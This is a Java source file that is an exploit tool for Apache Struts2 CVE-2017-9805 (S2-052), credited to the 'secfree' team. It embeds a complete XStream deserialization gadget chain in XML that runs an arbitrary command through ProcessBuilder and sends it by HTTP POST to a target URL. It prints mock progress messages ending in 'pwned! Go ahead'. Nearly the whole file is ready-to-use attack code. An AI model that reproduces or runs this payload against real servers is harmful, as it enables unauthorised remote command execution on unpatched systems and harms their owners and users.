package com.secfree.www.exploit;

import java.io.IOException;
import java.io.PrintWriter;
import java.net.HttpURLConnection;
import java.net.URL;

/**
 * Apache Struts2 CVE-2017-9805 (S2-052) - Exploit
 * 
 * http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-9805
 * 
 * http://struts.apache.org/docs/s2-052.html
 * 
 * https://secfree.com/article-333.html
 * 
 * @author secfreeTeam By Bearcat
 * 
 * @date 2017/10/21 01:06
 * 
 * @since 64-Bit JDK 1.8.0_131
 * 
 * @version v1
 */
public class Exploit {
	public static void main(String[] args) throws IOException, InterruptedException {
		if (args.length > 0) {
			String targetUrl = args[0];
			payload(targetUrl, shell(args[1]));
			System.out.print(" [*] Starting exploit");
			for (int i = 0; i < 3; i++) {
				Thread.sleep(300);
				System.out.print(".");
			}
			System.out.print("\n [*] Sending payloads");
			for (int i = 0; i < 3; i++) {
				Thread.sleep(300);
				System.out.print(".");
			}
			System.out.print("\n [*] Payloads sent");
			for (int i = 0; i < 3; i++) {
				Thread.sleep(300);
				System.out.print(".");
			}
			System.out.print("\n [*] Opening shell");
			for (int i = 0; i < 3; i++) {
				Thread.sleep(300);
				System.out.print(".");
			}
			System.out.print("\n [*] pwned! Go ahead");
			for (int i = 0; i < 3; i++) {
				Thread.sleep(300);
				System.out.print(".");
			}
		} else {
			System.out.println(" [*] Apache Struts2 CVE-2017-9805 (S2-052) - Exploit");
			System.out.println(" [*] 0day Info:https://secfree.com/article-333.html");
			System.out.println(" [*] Use:        <targetUrl> <command>");
			System.out.println(" [*] Author:  www.secFree.com Team By Bearcat");
		}
	}

	public static int payload(String targetUrl, String command) throws IOException {
		HttpURLConnection conn = null;
		URL url;
		PrintWriter out;
		String payload = "<map> <entry> <jdk.nashorn.internal.objects.NativeString> <flags>0</flags> <value class='com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data'> <dataHandler> <dataSource class='com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource'> <is class='javax.crypto.CipherInputStream'> <cipher class='javax.crypto.NullCipher'> <initialized>false</initialized> <opmode>0</opmode> <serviceIterator class='javax.imageio.spi.FilterIterator'> <iter class='javax.imageio.spi.FilterIterator'> <iter class='java.util.Collections$EmptyIterator'/> <next class='java.lang.ProcessBuilder'> <command> "
				+ command
				+ " </command> <redirectErrorStream>false</redirectErrorStream> </next> </iter> <filter class='javax.imageio.ImageIO$ContainsFilter'> <method> <class>java.lang.ProcessBuilder</class> <name>start</name> <parameter-types/> </method> <name>foo</name> </filter> <next class='string'>foo</next> </serviceIterator> <lock/> </cipher> <input class='java.lang.ProcessBuilder$NullInputStream'/> <ibuffer></ibuffer> <done>false</done> <ostart>0</ostart> <ofinish>0</ofinish> <closed>false</closed> </is> <consumed>false</consumed> </dataSource> <transferFlavors/> </dataHandler> <dataLen>0</dataLen> </value> </jdk.nashorn.internal.objects.NativeString> <jdk.nashorn.internal.objects.NativeString reference='../jdk.nashorn.internal.objects.NativeString'/> </entry> <entry> <jdk.nashorn.internal.objects.NativeString reference='../../entry/jdk.nashorn.internal.objects.NativeString'/> <jdk.nashorn.internal.objects.NativeString reference='../../entry/jdk.nashorn.internal.objects.NativeString'/> </entry> </map>";
		try {
			url = new URL(targetUrl);
			conn = (HttpURLConnection) url.openConnection();
			conn.setDoOutput(true);
			conn.setDoInput(true);
			conn.setRequestMethod("POST");
			conn.setRequestProperty("Content-Type", "application/xml");
			conn.connect();
			out = new PrintWriter(conn.getOutputStream());
			out.write(payload);
			out.close();
		} catch (Exception e) {
			e.printStackTrace();
		}
		return conn.getResponseCode();
	}

	public static String shell(String command) {
		String[] cmd = command.split(" ");
		command = "";
		for (int i = 0; i < cmd.length; i++) {
			command += "<string>" + cmd[i] + "</string>";
		}
		return command;
	}
}